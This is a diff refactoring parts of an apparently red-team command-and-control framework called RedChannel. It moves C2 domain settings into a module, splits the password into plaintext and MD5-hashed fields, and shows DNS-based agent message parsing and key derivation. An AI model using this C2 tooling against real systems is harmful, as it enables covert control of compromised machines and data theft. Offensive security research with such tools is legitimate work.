@@ -1,9 +1,8 @@
-import * as fs from "fs";
 import axios from "axios";
 import * as crypto from "crypto";
 import * as path from "path";
-import merge from "lodash.merge";
 import ECKey from "ec-key";
+import merge from "lodash.merge";
 
 import { Config, Constants, emsg } from "../utils/utils";
 import Crypto, { CipherModel, KeyExportType } from "./crypto";
@@ -27,17 +26,6 @@ export enum AgentCommand {
     AGENT_IGNORE = 0xff,
 }
 
-export type C2Config = {
-    domain: string;
-    dns_ip: string;
-    dns_port: number;
-    web_ip: string;
-    web_port: number;
-    interval: number;
-    plaintext_password: string;
-    binary_route: string;
-    web_url: string;
-};
 export type SkimmerConfig = {
     payload_route: string;
     data_route: string;
@@ -58,11 +46,6 @@ export type ImplantConfig = {
     resolver: string;
     interval: number;
     output_file: string;
-    debug: boolean;
-};
-
-export type RedChannelConfig = {
-    c2: C2Config;
     debug: boolean;
 };
 
@@ -127,11 +110,10 @@ export default class RedChannel {
      */
     modules: any;
 
-    masterPassword: string;
+    hashedPassword: string;
+    plaintextPassword: string;
 
     configFile: string;
-
-    config: RedChannelConfig;
 
     // the absolute path to the app directory
     appRoot: string = path.resolve("./");
@@ -140,58 +122,36 @@ export default class RedChannel {
 
     crypto: Crypto;
 
-    constructor(debug: boolean, domain: string, config: any, password: string, configFile?: string) {
+    constructor(debug: boolean, domain: string, password: string, cliConfig: any, configFile?: string) {
         this.log = new Logger();
 
         this.agents = new Map<AgentId, AgentModel>();
 
         this.configFile = configFile ?? Config.DEFAULT_CONFIG_FILE;
 
-        // merged with data from config file
-        this.config = {
-            c2: {
-                domain: domain ?? "",
-                dns_ip: "127.0.0.1",
-                dns_port: 53,
-                web_ip: "127.0.0.1",
-                web_port: 4321,
-                interval: 5000,
-                plaintext_password: "",
-                binary_route: "/agent",
-                web_url: "",
-            },
-            debug: debug,
+        this.modules = {
+            c2: new C2Module(domain, debug, this.configFile),
+            agent: new AgentModule(this.configFile),
+            skimmer: new SkimmerModule(this.configFile),
+            static_dns: new StaticDnsModule(this.configFile),
+            proxy: new ProxyModule(this.configFile, this, this.c2MessageHandler.bind(this)),
+            implant: new ImplantModule(this.configFile, this),
         };
 
-        this.config.c2.plaintext_password = password;
-        this.masterPassword = crypto.createHash("md5").update(password).digest("hex");
+        this.modules.c2.config = merge(this.modules.c2.config, cliConfig);
 
-        // read config file and merge with defaults to ensure properties exist
-        try {
-            const configData = JSON.parse(fs.readFileSync(this.configFile).toString());
-            this.config = merge(this.config, merge(configData, config));
-        } catch (ex) {
-            throw new Error(`Error reading configuration file '${this.configFile}': ${emsg(ex)}`);
-        }
-
-        if (!this.config.c2.domain) {
+        if (!this.modules.c2.config.domain) {
             throw new Error(`Please specify the c2 domain via cli or config file, see '--help'`);
         }
+
+        this.plaintextPassword = password;
+        this.hashedPassword = crypto.createHash("md5").update(password).digest("hex");
 
         this.appRoot = __dirname;
 
         this.crypto = new Crypto();
 
         this.flood = new Map<AgentId, NodeJS.Timeout>();
-
-        this.modules = {
-            agent: new AgentModule(this.configFile),
-            implant: new ImplantModule(this.configFile, this.config, this.modules),
-            proxy: new ProxyModule(this.configFile, this.config.c2.domain, this.c2MessageHandler.bind(this)),
-            c2: new C2Module(this.configFile),
-            skimmer: new SkimmerModule(this.configFile),
-            static_dns: new StaticDnsModule(this.configFile),
-        };
 
         if (this.modules.proxy.config.enabled) this.modules.proxy.proxyFetchLoop();
     }
@@ -449,7 +409,7 @@ export default class RedChannel {
                 question: [
                     {
                         type: "PROXY",
-                        name: `${q}.${this.config.c2.domain}`,
+                        name: `${q}.${this.modules.c2.config.domain}`,
                     },
                 ],
                 answer: [],
@@ -544,7 +504,7 @@ export default class RedChannel {
             return res.end();
         }
 
-        if (!hostname.endsWith(this.config.c2.domain)) {
+        if (!hostname.endsWith(this.modules.c2.config.domain)) {
             this.log.debug(`unknown c2 domain, ignoring query for: ${hostname}`);
             return res.end();
         }
@@ -555,7 +515,7 @@ export default class RedChannel {
             return res.end();
         }
 
-        const segments = hostname.slice(0, hostname.length - this.config.c2.domain.length).split(".");
+        const segments = hostname.slice(0, hostname.length - this.modules.c2.config.domain.length).split(".");
         if (segments.length < Config.EXPECTED_DATA_SEGMENTS) {
             this.log.error(`invalid message, not enough data segments (${segments.length}, expected ${Config.EXPECTED_DATA_SEGMENTS}): ${hostname}`);
 
@@ -763,7 +723,7 @@ export default class RedChannel {
                 this.log.success(`agent(${agentId}) keyx: ${agent.keyx.asPublicECKey().toString("spki")}`);
 
                 try {
-                    agent.secret = this.crypto.deriveSecret(agent.keyx, this.masterPassword);
+                    agent.secret = this.crypto.deriveSecret(agent.keyx, this.hashedPassword);
                 } catch (ex) {
                     this.log.error(`cannot derive secret for ${agentId}: ${emsg(ex)}`);
                     return AgentStatus.ERROR_DERIVING_SECRET;
